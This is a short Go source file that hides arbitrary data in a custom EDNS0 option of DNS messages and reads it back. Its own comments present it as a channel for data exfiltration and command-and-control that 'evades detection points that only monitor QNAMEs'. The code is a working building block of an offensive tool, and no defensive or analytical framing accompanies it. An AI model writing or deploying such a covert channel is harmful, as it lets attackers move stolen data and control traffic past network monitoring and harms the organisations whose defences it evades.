package dnsencoder

import (
	"fmt"

	"github.com/miekg/dns"
)

// EDNS0 Payload Exfiltration

const (
	// OptionCodeExfil is an experimental EDNS0 option code (65001-65534 range)
	// widely used for local/experimental purposes, making it ideal for C2.
	OptionCodeExfil = 65001
)

// InjectEDNS0Payload takes a dns.Msg, creates/modifies its OPT record,
// and injects the raw byte payload into an EDNS0 Local option.
// This evades detection points that only monitor QNAMEs.
func InjectEDNS0Payload(msg *dns.Msg, payload []byte) error {
	var opt *dns.OPT

	// Check if an OPT record already exists
	for _, extra := range msg.Extra {
		if o, ok := extra.(*dns.OPT); ok {
			opt = o
			break
		}
	}

	// If not, create and append a new one
	if opt == nil {
		opt = new(dns.OPT)
		opt.Hdr.Name = "."
		opt.Hdr.Rrtype = dns.TypeOPT
		opt.SetUDPSize(4096)
		msg.Extra = append(msg.Extra, opt)
	}

	// Package the payload into a local EDNS0 option
	ednsOpt := &dns.EDNS0_LOCAL{
		Code: OptionCodeExfil,
		Data: append([]byte(nil), payload...), // copy payload
	}

	opt.Option = append(opt.Option, ednsOpt)
	return nil
}

// ExtractEDNS0Payload extracts our custom data from an incoming EDNS0 record
func ExtractEDNS0Payload(msg *dns.Msg) ([]byte, error) {
	for _, extra := range msg.Extra {
		if opt, ok := extra.(*dns.OPT); ok {
			for _, o := range opt.Option {
				if o.Option() == OptionCodeExfil {
					if localOpt, ok := o.(*dns.EDNS0_LOCAL); ok {
						return localOpt.Data, nil
					}
				}
			}
		}
	}
	return nil, fmt.Errorf("EDNS0 payload option %d not found in query", OptionCodeExfil)
}
